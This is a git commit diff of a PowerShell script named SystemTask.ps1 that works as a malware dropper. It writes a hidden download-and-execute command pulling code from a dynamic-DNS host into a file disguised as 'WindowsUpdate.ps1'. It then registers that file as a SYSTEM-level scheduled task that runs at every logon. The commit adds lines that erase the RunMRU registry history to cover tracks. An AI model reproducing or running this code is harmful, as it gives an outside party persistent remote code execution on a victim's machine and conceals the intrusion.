4161603fa1fe87f47cd5e6d9f017ebae6d07865d
Gh0st1nTh3Sh3ll1 <Gh0st1nTh3Sh3llUIT@gmail.com>
2017-03-20 20:55:26 +0700

    Update SystemTask.ps1

--- SystemTask.ps1
+++ SystemTask.ps1
@@ -1,2 +1,5 @@
 powershell echo "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://gh0st1nth3sh3ll.hopto.org:443/a'))" > C:\Users\$env:USERNAME\AppData\WindowsUpdate.ps1
 powershell schtasks.exe /ru "SYSTEM" /create /sc ONLOGON /tn UpdateWindows /tr C:\Users\$env:USERNAME\AppData\WindowsUpdate.ps1
+$command = 'Remove-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse'
+iex $command
+exit
